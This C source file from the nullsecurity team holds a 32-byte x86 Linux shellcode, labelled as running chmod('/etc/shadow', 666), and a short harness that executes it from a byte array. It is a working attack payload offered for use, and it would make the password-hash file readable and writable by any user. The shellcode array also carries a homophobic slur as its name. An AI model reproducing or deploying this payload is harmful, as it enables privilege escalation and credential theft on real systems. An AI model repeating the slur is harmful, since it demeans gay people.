/*******************************************************************************
 *                                                                             *
 *         ~    .__ °.__   0       o                    ^   .__ °__  `´        *
 *  °____) __ __|  | | °|   ______°____ 0 ____  __ _________|__|/  |_ ___.__.  *
 *  /    \|  | °\  |°|  | °/  ___// __ \_/ ___\|  | °\_  __ \ o\   __<   |  |  *
 * | o°|  \  |  /  |_|  |__\___ \\  ___/\ °\___| o|  /|  | \/  ||  |° \___ O|  *
 * |___|  /____/|____/____/____ °>\___  >\___  >____/ |__|° |__||__|  / ____|  *
 * `´´`´\/´`nullsecurity team`´\/`´´`´\/`´``´\/  ``´```´```´´´´`´``0_o\/´´`´´  *
 *                                                                             *
 * chmod_linux.c                                                               *
 *                                                                             *
 * DATE                                                                        *
 * xx/xx/2008                                                                  *
 *                                                                             *
 * OS                                                                          *
 * Linux                                                                       *
 *                                                                             *
 * ARCH                                                                        *
 * x86                                                                         *
 *                                                                             *
 * TYPE                                                                        *
 * chmod("/etc/shadow", 666); exit();                                          *
 *                                                                             *
 * SIZE                                                                        *
 * 32 bytes                                                                    *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/


#include <stdio.h>


char gaycode[] =
    "\x31\xc9\x51\xb1\xb6\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f"
    "\x65\x74\x89\xe3\x6a\x0f\x58\xcd\x80\x6a\x01\x58\xcd\x80";

int main()
{
   void (*f)();


   f = (void *) gaycode;

   printf("%d\n", strlen(gaycode));

   f();

   return 1337;
}
